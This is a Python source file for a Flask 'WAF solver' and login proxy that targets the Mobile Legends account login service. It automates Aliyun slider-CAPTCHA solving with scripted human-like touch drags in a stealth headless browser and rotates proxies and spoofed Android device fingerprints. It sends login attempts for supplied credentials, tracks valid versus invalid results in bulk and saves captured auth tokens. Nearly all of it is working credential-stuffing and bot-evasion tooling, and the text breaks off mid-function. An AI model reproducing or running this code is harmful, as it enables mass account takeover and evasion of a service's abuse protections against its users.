# -*- coding: utf-8 -*-
# author: Tyraaah
"""
hostserver.py — WAF Solver (browser-backed warm-page pool) + login proxy

Fixes R1_BLOCKED and the FETCH_ERR:timeout storm by:
  - per-attempt AbortController (no shared abort across re-fires)
  - post-solve polling of the SAME promise (Aliyun SDK auto-resubmits)
  - only re-fire when the promise is genuinely dead
  - acw_tc + acw_sc__v2 both captured after the fetch fully resolves

Kept:
  - cycle reset every WAF_CYCLE_EVERY solves
  - timeout watchdog + dead-batch watchdog
  - pending_logins queue, kill_gen, monitor page, Cloudflare tunnel
"""
import hashlib, json, sys, time, random, string, threading, uuid, os, re, tempfile, shutil, subprocess, gzip, queue, math, asyncio
from flask import Flask, Response, request, jsonify
from datetime import datetime
# Windows consoles default to cp437/cp1252. Force UTF-8 and never raise on an
# unencodable character inside a Flask view (that turns into a 500).
for _stream in (sys.stdout, sys.stderr):
    try:
        _stream.reconfigure(encoding='utf-8', errors='backslashreplace')
    except Exception:
        pass

try:
    from curl_cffi.requests import Session
except ImportError:
    print("[!] pip install curl_cffi flask"); sys.exit(1)

try:
    from cloakbrowser import launch_async
    _HAS_BROWSER = True
except ImportError:
    _HAS_BROWSER = False
    print("[!] cloakbrowser not installed — /api/waf and /api/login will return 502 until you `pip install cloakbrowser`", flush=True)

app = Flask(__name__)

LOGIN_URL  = 'https://accountmtapi.mobilelegends.com'
LOGIN_PAGE = 'https://mtacc.mobilelegends.com/v3.0/inapp/loginbyemail'
MONITOR_KEY = 'ABCD1234'
HERE = os.path.dirname(os.path.abspath(__file__))
PORT = int(os.getenv("WAF_PORT", "5555"))

# * cycle config *
CYCLE_EVERY = int(os.getenv("WAF_CYCLE_EVERY", "100"))
_cycle_count = 0
_cycle_lock = threading.Lock()

def _bump_cycle():
    global _cycle_count
    with _cycle_lock:
        _cycle_count += 1
        return _cycle_count, (_cycle_count % CYCLE_EVERY == 0)

def _reset_cycle():
    global _cycle_count
    with _cycle_lock:
        old = _cycle_count
        _cycle_count = 0
        return old

# * token save *
TOKEN_FILE = os.path.join(os.path.dirname(os.path.abspath(__file__)), 'tokens.txt')
_token_file_lock = threading.Lock()

def _save_token_url(token_data):
    try:
        atoken = token_data.get('u_atoken', '')
        asig = token_data.get('u_asig', '')
        if not asig:
            return
        url = f"{LOGIN_URL}/?u_atoken={atoken}&u_asig={asig}"
        with _token_file_lock:
            with open(TOKEN_FILE, 'a', encoding='utf-8') as f:
                f.write(url + '\n')
        _register_token_url(asig, url)
    except Exception as e:
        print(f"  \033[91m* Token save failed: {e}\033[0m", flush=True)

# * proxies *
PROXIES = []

def _load_proxies(path):
    global PROXIES
    try:
        with open(path, 'r') as f:
            raw = [line.strip() for line in f if line.strip()]
        seen = set()
        for p in raw:
            if p not in seen:
                seen.add(p)
                PROXIES.append(f"http://{p}")
        print(f"  \033[93m* Loaded {len(PROXIES)} unique proxies from {path}\033[0m", flush=True)
    except FileNotFoundError:
        print(f"  \033[91m* Proxy file not found: {path}\033[0m", flush=True)

def _get_proxy():
    if not PROXIES:
        return None
    p = random.choice(PROXIES)
    return {'http': p, 'https': p}

# * devices *
DEVICES = [
    {'model':'SM-A055F','build':'AP3A.240905.015.A2','ver':'15','imp':'chrome','cv':'131.0.6778.200','brand':'"Chromium";v="131","Not_A Brand";v="24"'},
    {'model':'SM-A155F','build':'UP1A.231005.007',   'ver':'14','imp':'chrome','cv':'128.0.6613.146','brand':'"Chromium";v="128","Not;A=Brand";v="24"'},
    {'model':'SM-G990B','build':'UP1A.231005.007',   'ver':'14','imp':'chrome','cv':'126.0.6478.188','brand':'"Chromium";v="126","Not/A)Brand";v="8"'},
    {'model':'Pixel 7', 'build':'AP2A.240905.003',   'ver':'14','imp':'chrome','cv':'130.0.6723.116','brand':'"Chromium";v="130","Not?A_Brand";v="99"'},
    {'model':'Pixel 8', 'build':'AP3A.241005.015',   'ver':'15','imp':'chrome','cv':'131.0.6778.135','brand':'"Chromium";v="131","Not_A Brand";v="24"'},
    {'model':'Redmi Note 12','build':'TP1A.220624.014','ver':'13','imp':'chrome','cv':'124.0.6367.179','brand':'"Chromium";v="124","Not-A.Brand";v="99"'},
    {'model':'Redmi Note 13','build':'UKQ1.231108.001','ver':'14','imp':'chrome','cv':'129.0.6668.100','brand':'"Chromium";v="129","Not=A?Brand";v="8"'},
    {'model':'POCO X5',  'build':'UKQ1.230917.001',  'ver':'14','imp':'chrome','cv':'127.0.6533.103','brand':'"Chromium";v="127","Not)A;Brand";v="99"'},
    {'model':'POCO F5',  'build':'UKQ1.230917.001',  'ver':'14','imp':'chrome','cv':'125.0.6422.165','brand':'"Chromium";v="125","Not.A/Brand";v="24"'},
    {'model':'vivo Y36', 'build':'TP1A.220624.014',  'ver':'13','imp':'chrome','cv':'123.0.6312.118','brand':'"Chromium";v="123","Not:A-Brand";v="8"'},
    {'model':'vivo V29', 'build':'UP1A.231005.007',  'ver':'14','imp':'chrome','cv':'130.0.6723.86', 'brand':'"Chromium";v="130","Not?A_Brand";v="99"'},
    {'model':'OPPO A78', 'build':'TP1A.220624.014',  'ver':'13','imp':'chrome','cv':'126.0.6478.122','brand':'"Chromium";v="126","Not/A)Brand";v="8"'},
    {'model':'realme 11','build':'UKQ1.231108.001',  'ver':'14','imp':'chrome','cv':'128.0.6613.88', 'brand':'"Chromium";v="128","Not;A=Brand";v="24"'},
    {'model':'Samsung Galaxy A54','build':'UP1A.231005.007','ver':'14','imp':'chrome','cv':'129.0.6668.70','brand':'"Chromium";v="129","Not=A?Brand";v="8"'},
    {'model':'Infinix Note 30','build':'TP1A.220624.014','ver':'13','imp':'chrome','cv':'124.0.6367.113','brand':'"Chromium";v="124","Not-A.Brand";v="99"'},
    {'model':'Tecno Spark 10','build':'TP1A.220624.014','ver':'12','imp':'chrome','cv':'122.0.6261.119','brand':'"Chromium";v="122","Not(A:Brand";v="24"'},
]

def _make_ua(dev):
    return (f"Mozilla/5.0 (Linux; Android {dev['ver']}; {dev['model']} "
            f"Build/{dev['build']}; wv) AppleWebKit/537.36 (KHTML, like Gecko) "
            f"Version/4.0 Chrome/{dev['cv']} Mobile Safari/537.36;UniWebView;mtakit")

def _make_sec_headers(dev):
    return {
        'Sec-Ch-Ua':          f'{dev["brand"]}',
        'Sec-Ch-Ua-Mobile':   '?1',
        'Sec-Ch-Ua-Platform': '"Android"',
        'Sec-Ch-Ua-Full-Version': dev['cv'],
        'Sec-Ch-Ua-Model':    f'"{dev["model"]}"',
        'Sec-Ch-Ua-Platform-Version': f'"{dev["ver"]}.0.0"',
    }

# * session store *
waf_sessions = {}
waf_sessions_lock = threading.Lock()

def _store_session(sid, dev, proxy, ua, sess):
    with waf_sessions_lock:
        waf_sessions[sid] = {'dev': dev, 'proxy': proxy, 'ua': ua, 'sess': sess, 'ts': time.time()}
        now = time.time()
        expired = [k for k, v in waf_sessions.items() if now - v['ts'] > 300]
        for k in expired:
            del waf_sessions[k]

# * state *
TOKEN_EXPIRY = 120
lock        = threading.Lock()
token_pool  = []
used_sigs   = set()
known_sigs  = set()
total_ok    = 0
total_fail  = 0
total_valid   = 0
total_invalid = 0
t_start     = time.time()
logs        = []

consumer_stats = {}
consumer_lock  = threading.Lock()

# --- consecutive-timeout watchdog -----------------------------------------
TIMEOUT_WATCHDOG = int(os.getenv("WAF_TIMEOUT_WATCHDOG", "6"))

# --- dead-batch watchdog ---------------------------------------------------
DEAD_BATCH_THRESHOLD = int(os.getenv("WAF_DEAD_BATCH", "40"))
DEAD_BATCH_WINDOW = float(os.getenv("WAF_DEAD_BATCH_WINDOW", "180"))
WATCHDOG_COOLDOWN = float(os.getenv("WAF_WATCHDOG_COOLDOWN", "30"))
_consecutive_timeouts = 0
_timeout_lock = threading.Lock()
_last_watchdog_reset = 0.0
_dead_streak = 0
_dead_ok_since_reset = 0
_dead_first_ts = 0.0
_dead_lock = threading.Lock()

_kill_gen = 0
_kill_gen_lock = threading.Lock()

def _bump_kill_gen():
    global _kill_gen
    with _kill_gen_lock:
        _kill_gen += 1
        return _kill_gen

def _current_kill_gen():
    with _kill_gen_lock:
        return _kill_gen


def _watchdog_reset():
    """Server-side recovery equivalent to pressing Kill & Reset."""
    _bump_kill_gen()
    _reset_cycle()
    with pending_logins_lock:
        dropped = len(pending_logins)
        pending_logins.clear()
    with waf_sessions_lock:
        waf_sessions.clear()
    drained = 0
    while not _PREFETCH_QUEUE.empty():
        try:
            _PREFETCH_QUEUE.get_nowait()
            drained += 1
        except Exception:
            break
    print(f"  \033[93m* WATCHDOG RESET * dropped={dropped} drained={drained}\033[0m", flush=True)
    try:
        _log(f"watchdog reset: dropped={dropped} drained={drained}")
    except Exception:
        pass


def _record_timeout():
    global _consecutive_timeouts, _last_watchdog_reset
    with _timeout_lock:
        _consecutive_timeouts += 1
        streak = _consecutive_timeouts
        now = time.time()
        if streak < TIMEOUT_WATCHDOG:
            return False
        if now - _last_watchdog_reset < WATCHDOG_COOLDOWN:
            return False
        _last_watchdog_reset = now
        _consecutive_timeouts = 0
    print(f"  \033[93m* WATCHDOG: {streak} consecutive timeouts * reset, continuing\033[0m", flush=True)
    _watchdog_reset()
    return True


def _record_alive():
    global _consecutive_timeouts
    with _timeout_lock:
        _consecutive_timeouts = 0


def record_login_verdict(kind):
    """kind: "valid" | "invalid" | "error". Detects a poisoned batch."""
    global _dead_streak, _dead_ok_since_reset, _dead_first_ts
    now = time.time()
    with _dead_lock:
        if kind == "valid":
            _dead_ok_since_reset += 1
            _dead_streak = 0
            _dead_first_ts = 0.0
            return False
        if kind != "invalid":
            return False
        _dead_streak += 1
        if _dead_first_ts == 0.0:
            _dead_first_ts = now
        streak = _dead_streak
        ok = _dead_ok_since_reset
        span = now - _dead_first_ts
    if ok > 0:
        return False
    if streak < DEAD_BATCH_THRESHOLD:
        return False
    if span > DEAD_BATCH_WINDOW:
        return False
    with _dead_lock:
        if _dead_ok_since_reset > 0:
            return False
        _dead_streak = 0
        _dead_first_ts = 0.0
    print(f"  \033[91m* DEAD BATCH: {streak} INVALID in {span:.0f}s with 0 VALID "
          f"* resetting (was kill & reset by hand)\033[0m", flush=True)
    try:
        _log(f"dead batch detected: {streak} invalid / {span:.0f}s", False)
    except Exception:
        pass
    _watchdog_reset()
    return True



# * pending login queue *
pending_logins = []
pending_logins_lock = threading.Lock()

def _track_consumer(ip):
    with consumer_lock:
        if ip not in consumer_stats:
            consumer_stats[ip] = {'count': 0, 'first': time.time(), 'last': 0}
        consumer_stats[ip]['count'] += 1
        consumer_stats[ip]['last'] = time.time()

_token_url_map      = {}
_token_url_map_lock = threading.Lock()

def _register_token_url(asig, url_line):
    with _token_url_map_lock:
        _token_url_map[asig] = url_line

def _cleanup_expired_tokens():
    while True:
        try:
            time.sleep(10)
            now = time.time()
            expired_sigs = set()
            with lock:
                active_sigs = {t.get('u_asig', '') for t in token_pool}
            with _token_url_map_lock:
                sigs_to_check = list(_token_url_map.keys())
            with lock:
                for sig in sigs_to_check:
                    if sig in used_sigs or sig not in active_sigs:
                        expired_sigs.add(sig)
            if not expired_sigs:
                continue
            with _token_file_lock:
                if not os.path.exists(TOKEN_FILE):
                    continue
                with open(TOKEN_FILE, 'r', encoding='utf-8') as f:
                    lines = f.readlines()
                new_lines = []
                removed = 0
                for line in lines:
                    line_stripped = line.strip()
                    if not line_stripped:
                        continue
                    m = re.search(r'u_asig=([^&\s]+)', line_stripped)
                    if m and m.group(1) in expired_sigs:
                        removed += 1
                        continue
                    new_lines.append(line)
                if removed > 0:
                    with open(TOKEN_FILE, 'w', encoding='utf-8') as f:
                        f.writelines(new_lines)
                    _log(f"* Cleaned {removed} expired tokens from file", True)
            with _token_url_map_lock:
                for sig in expired_sigs:
                    _token_url_map.pop(sig, None)
        except Exception as e:
            print(f"  \033[91m* Token cleanup error: {e}\033[0m", flush=True)

threading.Thread(target=_cleanup_expired_tokens, daemon=True).start()

def _log(msg, ok=True):
    global logs
    logs.append({'ts': datetime.now().strftime('%H:%M:%S'), 'msg': msg, 'ok': ok})
    if len(logs) > 200:
        logs = logs[-200:]

# ══════════════════════════════════════════════════════════════════════════
#  BROWSER + WARM-PAGE POOL
# ══════════════════════════════════════════════════════════════════════════
WAF_FETCH_URL       = 'https://accountmtapi.mobilelegends.com/'
WARM_SIZE           = int(os.environ.get('WAF_WARM_PAGES', '4'))
WARM_REBUILD_USE    = int(os.environ.get('WAF_WARM_REBUILD', '20'))
POLL_INTERVAL_S     = float(os.environ.get('WAF_POLL_INTERVAL', '0.08'))
WAF_FETCH_TIMEOUT_S = int(os.environ.get('WAF_SOLVE_TIMEOUT', '45'))
FETCH_TIMEOUT_MS    = int(os.environ.get('WAF_FETCH_TIMEOUT_MS', '30000'))
_DEBUG = os.environ.get('WAF_DEBUG', '1') != '0'
def dbg(m):
    if _DEBUG: print(f"  DBG {m}", flush=True)

_waf_browser      = None
_waf_browser_lock = threading.Lock()
_waf_loop         = None
_waf_loop_ready   = threading.Event()

_warm_queue   = None
_warm_init    = None
_warm_browser = None

def _ensure_waf_loop():
    global _waf_loop
    with _waf_browser_lock:
        if _waf_loop is not None:
            return _waf_loop
        _waf_loop = asyncio.new_event_loop()
        def _run():
            asyncio.set_event_loop(_waf_loop)
            _waf_loop_ready.set()
            _waf_loop.run_forever()
        threading.Thread(target=_run, daemon=True, name="waf-loop").start()
        _waf_loop_ready.wait(timeout=5)
        return _waf_loop

async def _get_waf_browser():
    global _waf_browser
    if _waf_browser is None:
        _waf_browser = await launch_async(headless=True, humanize=True)
    return _waf_browser

async def _make_warm_page(browser, wid=0):
    ctx = await browser.new_context(has_touch=True)
    page = await ctx.new_page()
    page.set_default_timeout(25000)
    try:
        await page.goto(LOGIN_PAGE, wait_until="domcontentloaded", timeout=30000)
    except Exception as e:
        dbg(f"w{wid} goto failed: {str(e)[:120]}")
    try:
        await page.wait_for_selector("#aliyunCaptcha-sliding-slider", timeout=4000)
        dbg(f"w{wid} WAF slider appeared on load")
    except Exception:
        pass
    dbg(f"w{wid} page ready")
    return (ctx, page, wid, 0)

async def _init_warm_pool():
    global _warm_queue, _warm_browser, _warm_init
    if _warm_queue is not None:
        return
    _warm_browser = await _get_waf_browser()
    _warm_queue = asyncio.Queue()
    _warm_init = asyncio.Event()
    async def _prime():
        for wid in range(WARM_SIZE):
            try:
                item = await _make_warm_page(_warm_browser, wid)
                _warm_queue.put_nowait(item)
            except Exception as e:
                print(f"  \033[91m* warm prime err w{wid}: {e}\033[0m", flush=True)
        _warm_init.set()
        print(f"  \033[92m* Warm pool ready ({WARM_SIZE} pages)\033[0m", flush=True)
    asyncio.ensure_future(_prime())

async def _acquire_warm():
    if _warm_queue is None:
        await _init_warm_pool()
    try:
        await asyncio.wait_for(_warm_init.wait(), timeout=30)
    except asyncio.TimeoutError:
        pass
    try:
        return await asyncio.wait_for(_warm_queue.get(), timeout=30)
    except asyncio.TimeoutError:
        browser = _warm_browser or await _get_waf_browser()
        return await _make_warm_page(browser, 0)

async def _rearm(ctx, page, wid, uses):
    try:
        if uses + 1 >= WARM_REBUILD_USE:
            try: await ctx.close()
            except Exception: pass
            browser = _warm_browser or await _get_waf_browser()
            _warm_queue.put_nowait(await _make_warm_page(browser, wid))
            return
        await page.goto("about:blank", wait_until="commit", timeout=8000)
        await page.goto(LOGIN_PAGE, wait_until="domcontentloaded", timeout=20000)
        _warm_queue.put_nowait((ctx, page, wid, uses + 1))
    except Exception:
        try: await ctx.close()
        except Exception: pass
        try:
            browser = _warm_browser or await _get_waf_browser()
            _warm_queue.put_nowait(await _make_warm_page(browser, wid))
        except Exception:
            pass

def _spawn_rearm(ctx, page, wid, uses):
    asyncio.ensure_future(_rearm(ctx, page, wid, uses))

# ══════════════════════════════════════════════════════════════════════════
#  IN-PAGE FETCH + SLIDER SOLVER
# ══════════════════════════════════════════════════════════════════════════
FETCH_HEADERS = {
    "Content-Type": "application/json",
    "Accept": "application/json, text/plain, */*",
    "X-Requested-With": "com.mobile.legends",
    "Referer": LOGIN_PAGE,
    "Origin": "https://mtacc.mobilelegends.com",
}

def _abortable_fetch_js(body, var_name="__loginPromise",
                        abort_var="__loginAbort", timeout_ms=None):
    """Build the in-page fetch bootstrap.

    The caller MUST pass a unique (var_name, abort_var) pair per attempt.
    Sharing them across attempts causes the 2nd attempt's fetch to be killed
    by the 1st attempt's already-fired AbortController — the source of the
    FETCH_ERR:timeout storm.
    """
    if timeout_ms is None:
        timeout_ms = FETCH_TIMEOUT_MS
    return (
        f"(()=>{{"
        f"try{{if(window.{abort_var})window.{abort_var}.abort();}}catch(e){{}}"
        f"const ctl=new AbortController();"
        f"window.{abort_var}=ctl;"
        f"const tm=setTimeout(()=>{{try{{ctl.abort();}}catch(e){{}}}},{timeout_ms});"
        f"window.{var_name}=fetch('{WAF_FETCH_URL}',{{method:'POST',credentials:'include',"
        f"headers:{json.dumps(FETCH_HEADERS)},body:{json.dumps(body)},signal:ctl.signal}})"
        f".then(r=>r.text())"
        f".catch(e=>'FETCH_ERR:'+((e&&e.name==='AbortError')?'timeout_abort':(e&&e.message||e)))"
        f".finally(()=>clearTimeout(tm));"
        f"}})();"
    )


def _abort_js(var_name, abort_var):
    """Abort + clear a specific attempt's fetch state."""
    return (f"()=>{{try{{if(window.{abort_var})window.{abort_var}.abort()}}"
            f"catch(e){{}};"
            f"try{{delete window.{var_name}}}catch(e){{}};"
            f"try{{delete window.{abort_var}}}catch(e){{}}}}")


async def _collect_cookies(ctx):
    cookies = {}
    try:
        for ck in await ctx.cookies():
            cookies[ck['name']] = ck['value']
    except Exception:
        pass
    return cookies

async def _dispatch(cdp, etype, x, y, keep=False):
    pts = [] if keep else [{"x": float(x), "y": float(y),
                            "radiusX": 6, "radiusY": 6, "force": 1, "id": 1}]
    try:
        await cdp.send("Input.dispatchTouchEvent",
                       {"type": etype, "touchPoints": pts})
    except Exception:
        pass

async def _human_drag(ctx, page, sx, sy, dist):
    try:
        cdp = await ctx.new_cdp_session(page)
        R = lambda a, b: a + random.random() * (b - a)
        pts = []
        x = 0.0
        acc_end = dist * R(0.28, 0.40)
        for i in range(2 + int(random.random() * 2)):
            x += R(3, 7) * (1 + i * 0.6)
            if x > acc_end:
                x = acc_end
                break
            pts.append({"x": x, "d": R(6, 12)})
        nf = 4 + int(random.random() * 3)
        rem = dist - x
        for i in range(nf):
            step = rem / (nf - i) * R(0.8, 1.2)
            if step < 4 or x + step >= dist - 1:
                break
            x += step
            pts.append({"x": x, "d": R(2, 5)})
        pts.append({"x": dist + R(1.5, 3), "d": R(6, 11)})
        pts.append({"x": dist + R(-1, 1),   "d": R(5, 9)})
        pts.append({"x": dist,              "d": R(3, 6)})
        await _dispatch(cdp, "touchStart", sx, sy)
        await asyncio.sleep(R(8, 15) / 1000)
        for p in pts:
            prog = min(p["x"] / dist, 1.0) if dist > 0 else 0
            wb = 2.6 * math.sin(math.pi * prog)
            dy = wb * 0.3 if p["x"] >= dist else wb * R(0.55, 1.0)
            await _dispatch(cdp, "touchMove", sx + p["x"], sy + dy + R(-0.4, 0.4))
            await asyncio.sleep(p["d"] / 1000)
        await _dispatch(cdp, "touchEnd", sx + dist, sy, keep=True)
        return True
    except Exception as e:
        print(f"  \033[91m* drag err: {e}\033[0m", flush=True)
        return False

async def _solve_waf_in_page(page, ctx, wid=0):
    try:
        present = await page.evaluate(
            "()=>!!document.getElementById('aliyunCaptcha-sliding-slider')")
    except Exception:
        present = False
    if not present:
        return True, "no_slider"

    try:
        await page.wait_for_function(
            "()=>{const s=document.getElementById('aliyunCaptcha-sliding-slider');"
            "if(!s) return false;"
            "const r=s.getBoundingClientRect();"
            "return r.width>10 && r.height>10;}",
            timeout=5000)
    except Exception:
        return False, "slider_not_ready"

    box = await page.evaluate(r"""()=>{
        const s=document.getElementById('aliyunCaptcha-sliding-slider');
        if(!s) return null;
        const r=s.getBoundingClientRect();
        const w=s.closest('#aliyunCaptcha-sliding-wrapper')||s.parentElement;
        const pr=w?w.getBoundingClientRect():r;
        return {x:r.x,y:r.y,w:r.width,h:r.height,mt:pr.width-r.width};
    }""")
    if not box:
        return False, "no_box"

    try:
        pre_acw = {c["name"] for c in await ctx.cookies() if c["name"].startswith("acw")}
    except Exception:
        pre_acw = set()

    dist = max(40.0, box.get("mt", 280.0))
    verify_ok = {"value": False}

    async def on_response(response):
        url = response.url or ""
        if not any(k in url for k in ("verify","slideVerify","captcha","_____tmd_____")):
            return
        try:
            text = await response.text()
            dbg(f"verify resp: {response.status} {url[-70:]} body={text[:100]}")
            if ('"VerifyResult":true' in text
                or '"success":true' in text
                or '"Success":true' in text):
                verify_ok["value"] = True
        except Exception:
            pass
    page.on("response", on_response)

    sx = box["x"] + box["w"] / 2
    sy = box["y"] + box["h"] / 2
    dbg(f"w{wid} sliding {int(dist)}px")
    dragged = await _human_drag(ctx, page, sx, sy, dist)

    solved, reason = False, ("drag_failed" if not dragged else "slider_still_visible")
    if dragged:
        for _ in range(60):
            if verify_ok["value"]:
                solved, reason = True, "verify_confirmed"; break
            try:
                names = {c["name"] for c in await ctx.cookies()}
            except Exception:
                names = set()
            if {n for n in names if n.startswith("acw")} - pre_acw:
                solved, reason = True, "acw_cookie"; break
            try:
                still = await page.evaluate(
                    "()=>!!document.getElementById('aliyunCaptcha-sliding-slider')")
            except Exception:
                still = True
            if not still:
                await asyncio.sleep(0.25)
                try:
                    names = {c["name"] for c in await ctx.cookies()}
                except Exception:
                    names = set()
                if {n for n in names if n.startswith("acw")} - pre_acw:
                    solved, reason = True, "acw_cookie_after_hide"
                else:
                    reason = "hidden_no_cookie"
                break
            await asyncio.sleep(0.08)

    try: page.remove_listener("response", on_response)
    except Exception: pass
    return solved, reason


async def _poll_login_attempt(page, ctx, wid, promise_var, abort_var,
                              attempt_idx, max_wait_s):
    """Poll one fetch attempt to completion, solving any slider inline.

    Returns (text, solved_once, reason):
      text        — fetch result if it landed ('FETCH_ERR:...' on error)
      solved_once — True if we solved a slider during this attempt
      reason      — debug tag
    """
    started = time.time()
    solved = False
    while time.time() - started < max_wait_s:
        try:
            combined = await page.evaluate("""async(pvar)=>{
                const slider = !!document.getElementById('aliyunCaptcha-sliding-slider');
                if (slider) return {slider:true, res:'__PENDING__'};
                if (!window[pvar]) return {slider:false, res:'__PENDING__'};
                const t = new Promise(r=>setTimeout(()=>r('__PENDING__'), 50));
                const res = await Promise.race([window[pvar], t]);
                return {slider:false, res};
            }""", promise_var)
        except Exception:
            combined = {"slider": False, "res": "__PENDING__"}

        if combined.get("res") and combined["res"] != "__PENDING__":
            return combined["res"], solved, "fetch_done"

        if combined.get("slider"):
            dbg(f"w{wid} attempt{attempt_idx} solving slider...")
            ok, _r = await _solve_waf_in_page(page, ctx, wid)
            if ok:
                dbg(f"w{wid} attempt{attempt_idx} verify confirmed")
                solved = True
                # After a successful drag the Aliyun SDK typically re-submits
                # the form automatically. Give it up to 8s to fire before
                # declaring this attempt dead (outer loop then re-fires).
                re_submit_deadline = time.time() + 8
                while time.time() < re_submit_deadline:
                    try:
                        combined2 = await page.evaluate("""async(pvar)=>{
                            if (!window[pvar]) return {slider:false, res:'__PENDING__'};
                            const t = new Promise(r=>setTimeout(()=>r('__PENDING__'), 100));
                            const res = await Promise.race([window[pvar], t]);
                            return {slider:!!document.getElementById('aliyunCaptcha-sliding-slider'), res};
                        }""", promise_var)
                    except Exception:
                        combined2 = {"slider": False, "res": "__PENDING__"}
                    if combined2.get("res") and combined2["res"] != "__PENDING__":
                        return combined2["res"], solved, "post_solve"
                    if combined2.get("slider"):
                        # A fresh slider was issued; try again on this attempt.
                        dbg(f"w{wid} attempt{attempt_idx} new slider post-solve")
                        break
                    await asyncio.sleep(0.1)
                if time.time() >= re_submit_deadline:
                    return None, solved, "post_solve_no_resubmit"
                # else: broke out because new slider appeared — loop the outer
                # while to re-detect and re-drag it
            else:
                dbg(f"w{wid} attempt{attempt_idx} slider solve failed")
                await asyncio.sleep(0.3)

        await asyncio.sleep(POLL_INTERVAL_S)

    return None, solved, "poll_timeout"


# ══════════════════════════════════════════════════════════════════════════
#  BROWSER-BACKED WAF FETCH  (/api/waf probe path)
# ══════════════════════════════════════════════════════════════════════════
async def _async_fetch_waf_browser():
    """Mint a fresh WAF clearance via a warm page. Same per-attempt
    AbortController discipline as _async_browser_login."""
    if not _HAS_BROWSER:
        return None, {}, "browser_not_available", None

    sid = uuid.uuid4().hex[:16]
    dev = random.choice(DEVICES)
    email = 'p_' + ''.join(random.choices(string.ascii_lowercase + string.digits, k=10)) + '@sv.dev'
    pwd   = 'x' + str(random.randint(100, 9999))
    body  = _body3(email, pwd)

    try:
        await _get_waf_browser()
        await _init_warm_pool()
        ctx, page, wid, uses = await _acquire_warm()
    except Exception as e:
        return None, {}, f"pool_acquire:{type(e).__name__}:{str(e)[:120]}", sid

    txt = ""
    try:
        for attempt in range(1, 4):
            promise_var = f"__wafPromise{attempt}"
            abort_var   = f"__wafAbort{attempt}"
            fetch_js = _abortable_fetch_js(
                body, var_name=promise_var, abort_var=abort_var,
                timeout_ms=FETCH_TIMEOUT_MS)
            try:
                await page.evaluate(fetch_js)
            except Exception as e:
                dbg(f"w{wid} waf attempt{attempt} eval err: {str(e)[:80]}")
                await asyncio.sleep(0.3)
                continue

            per_attempt_budget = max(15, WAF_FETCH_TIMEOUT_S - 5)
            res, _did_solve, reason = await _poll_login_attempt(
                page, ctx, wid, promise_var, abort_var,
                attempt_idx=attempt, max_wait_s=per_attempt_budget)
            if res:
                txt = res
                break
            try:
                await page.evaluate(_abort_js(promise_var, abort_var))
            except Exception:
                pass
            dbg(f"w{wid} waf attempt{attempt} → {reason}, re-firing")
            await asyncio.sleep(0.2)

        for attempt in range(1, 4):
            try:
                await page.evaluate(_abort_js(f"__wafPromise{attempt}",
                                              f"__wafAbort{attempt}"))
            except Exception:
                pass

        cookies = await _collect_cookies(ctx)
        acw = sorted(n for n in cookies if n.startswith("acw"))
        dbg(f"w{wid} waf cookies after solve: {acw} (total {len(cookies)})")

        try:
            sess = Session(impersonate=dev['imp'], verify=False, proxies=_get_proxy())
            for k, v in cookies.items():
                sess.cookies.set(k, v)
            _store_session(sid, dev, _get_proxy(), _make_ua(dev), sess)
        except Exception:
            pass

        _spawn_rearm(ctx, page, wid, uses)

        if txt and txt.strip().startswith("{"):
            try:
                html = await page.content()
            except Exception:
                html = "<html><body>waf_clear</body></html>"
            return _inject_base(html), cookies, None, sid
        if not txt:
            return None, cookies, "timeout_poll", sid
        if txt.startswith("FETCH_ERR"):
            return None, cookies, txt, sid
        try:
            html = await page.content()
        except Exception:
            html = "<html><body>waf_clear</body></html>"
        return _inject_base(html), cookies, None, sid

    except Exception as e:
        try: _spawn_rearm(ctx, page, wid, uses)
        except Exception: pass
        return None, {}, f"browser_error:{type(e).__name__}:{str(e)[:120]}", sid


def _fetch_waf():
    """Synchronous wrapper. Same 4-tuple as the old function."""
    if not _HAS_BROWSER:
        err = "browser_not_available — install cloakbrowser"
        _log(err, False)
        return None, {}, err, None
    loop = _ensure_waf_loop()
    fut  = asyncio.run_coroutine_threadsafe(_async_fetch_waf_browser(), loop)
    try:
        return fut.result(timeout=WAF_FETCH_TIMEOUT_S + 30)
    except Exception as e:
        return None, {}, f"timeout_or_error:{e}", None

# ══════════════════════════════════════════════════════════════════════════
#  BROWSER-BACKED LOGIN  (fixes R1_BLOCKED on /api/login)
# ══════════════════════════════════════════════════════════════════════════
async def _async_browser_login(account, password):
    """Fire the REAL login POST inside a warm Chromium page. Returns
    (text, cookies, error, sid).

    Each re-fire attempt uses a FRESH (promise_var, abort_var) pair, so an
    already-fired AbortController cannot kill the next fetch. After a slider
    solves, we poll the SAME promise for up to 8s waiting for the Aliyun SDK
    to auto-resubmit the login POST. Only if that doesn't happen do we fire a
    fresh attempt.
    """
    if not _HAS_BROWSER:
        return None, {}, "browser_not_available", None

    sid = uuid.uuid4().hex[:16]
    dev = random.choice(DEVICES)
    body = _body3(account, password)

    try:
        await _get_waf_browser()
        await _init_warm_pool()
        ctx, page, wid, uses = await _acquire_warm()
    except Exception as e:
        return None, {}, f"pool_acquire:{type(e).__name__}:{str(e)[:120]}", sid

    txt = ""
    try:
        for attempt in range(1, 5):
            promise_var = f"__loginPromise{attempt}"
            abort_var   = f"__loginAbort{attempt}"
            fetch_js = _abortable_fetch_js(
                body, var_name=promise_var, abort_var=abort_var,
                timeout_ms=FETCH_TIMEOUT_MS)

            try:
                await page.evaluate(fetch_js)
            except Exception as e:
                dbg(f"w{wid} attempt{attempt} fetch eval err: {str(e)[:80]}")
                await asyncio.sleep(0.3)
                continue

            per_attempt_budget = max(15, WAF_FETCH_TIMEOUT_S - 5)
            res, _did_solve, reason = await _poll_login_attempt(
                page, ctx, wid, promise_var, abort_var,
                attempt_idx=attempt, max_wait_s=per_attempt_budget)
            if res:
                txt = res
                break

            try:
                await page.evaluate(_abort_js(promise_var, abort_var))
            except Exception:
                pass

            if reason in ("post_solve_no_resubmit", "poll_timeout"):
                dbg(f"w{wid} attempt{attempt} → {reason}, re-firing")
                await asyncio.sleep(0.2)
                continue
            else:
                dbg(f"w{wid} attempt{attempt} → {reason}")
                break

        # Clean up any dangling vars
        for attempt in range(1, 5):
            try:
                await page.evaluate(_abort_js(f"__loginPromise{attempt}",
                                              f"__loginAbort{attempt}"))
            except Exception:
                pass

        cookies = await _collect_cookies(ctx)
        acw = sorted(n for n in cookies if n.startswith("acw"))
        dbg(f"w{wid} login cookies after solve: {acw} (total {len(cookies)})")

        try:
            sess = Session(impersonate=dev['imp'], verify=False, proxies=_get_proxy())
            for k, v in cookies.items():
                sess.cookies.set(k, v)
            _store_session(sid, dev, _get_proxy(), _make_ua(dev), sess)
        except Exception:
            pass

